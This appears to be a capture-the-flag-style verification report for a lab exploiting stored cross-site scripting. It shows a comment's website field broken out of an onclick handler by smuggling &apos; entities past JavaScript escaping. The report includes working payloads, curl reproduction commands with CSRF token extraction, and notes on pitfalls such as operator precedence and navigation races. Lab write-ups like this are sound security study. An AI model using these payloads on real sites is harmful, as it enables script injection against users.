# Verification — Entity-smuggled breakout in stored onclick

## Methodology
1. Template revelation: benign `website` store → read the rendered anchor (the
   `onclick` tracker shape is undiscoverable without a website-bearing comment).
2. Encoding map with `'"<>&\&apos;` in ONE probe (the trailing `&apos;` tests the
   hypothesis directly).
3. Entity-decode confirmation at the DOM level (`getAttribute` returns DECODED value).
4. Click-execution proof via CDP with SYNC read (same-turn, pre-navigation).
5. Trap diagnoses (inner-quote escaping, precedence, navigation race) each fixed and recorded.
6. Lab acceptance: real-browser click; banner polls.

## Evidence

### 1. Template (benign store, `website=https://example.com/TMPLPATH`)
```html
<a id="author" href="https://example.com/TMPLPATH" onclick="var tracker={track(){}};tracker.track('https://example.com/TMPLPATH');">TmplProbe</a>
```

### 2. Encoding map (probe `'"<>&\&apos;`, read rendered bytes)
```
href AND onclick:  https://ENCMARK.example.com/\'&quot;&lt;&gt;&\\&apos;
```
`'`→`\'`, `"`→`&quot;`, `<>`→entities, `\`→`\\`, `&`→`&` RAW — the sole survivor,
in BOTH reflections identically.

### 3. Entity-decode proof (CDP `getAttribute` = post-decode value)
```
onclick attr: var tracker={track(){}};tracker.track('http://ent2.example.com/?'-document.title=606001-'');
```
The `&apos;` sequences are GONE, replaced by live `'` string terminators — decode
stage directly observed. (Versus raw-response grep, which still shows `&apos;`:
always assert on the DECODED value for code sinks.)

### 4. Click-execution proof (CDP, sync click+read)
```
website=…?&apos;-(document.title=606002)-&apos;  →  post-click title=606002
```
Parenthesized assignment (precedence trap avoided); read in the same JS turn as
`.click()`, before href-navigation replaces the document.

### 5. Trap diagnoses (all hit live, all fixed)
(a) **Inner-quote escaping**: `&apos;-document.title='ENTMARK'&apos;` → server
escapes the INNER quotes (`\'ENTMARK\'`) → decoded handler has stray backslashes →
silent no-fire. Rule: quoteless/numeric markers inside entity-smuggled payloads
(the escaper covers the whole input, including post-decode regions).
(b) **Operator precedence** (`-x=1` needs parens): unparenthesized assignment parsed
as `(str - x) = 1` → "Invalid left-hand side" throw, title unchanged DESPITE correct
structure. Third KB appearance — now a reflex check for every `-…=` shape.
(c) **Navigation race**: plain click+read observed the HREF target's title
(`ent2.example.com`), not the handler's — onclick runs first, navigation destroys
evidence second. Fix: sync same-turn read (or preventDefault harness).

### 6. Lab acceptance
Stored `http://click.example.com/?&apos;-alert(1)-&apos;` (quoteless inner,
call-operand — no traps) → real-browser click on "ClickAuthor" → `alert(1)` →
`is-solved`.

## Reproducibility
```
BASE=…; JAR=ck; CSRF=$(curl -s -b $JAR -c $JAR "$BASE/post?postId=1" | grep -oP 'name="csrf" value="\K[^"]+' | head -1)
# map (&-raw check):
curl -b $JAR -c $JAR --data-urlencode "csrf=$CSRF" --data-urlencode "postId=1" --data-urlencode "comment=c" --data-urlencode "name=N" --data-urlencode "email=e@x.y" --data-urlencode "website=https://E.example.com/'\"<>&\\&apos;" "$BASE/post/comment"
curl -b $JAR "$BASE/post?postId=1" | grep -oE 'id="author"[^>]*>' | head -1
# click proof: CDP navigate → getAttribute (decoded breakout) → sync click+read title
```

## Confirmation criteria
- CONFIRMED: template shape, per-char encoding incl. `&`-raw, entity-decode at DOM
  level, click execution (sync-read), real-browser acceptance.
- Each trap fix is load-bearing methodology (inner-quote, precedence, race) for
  future entity/handler work.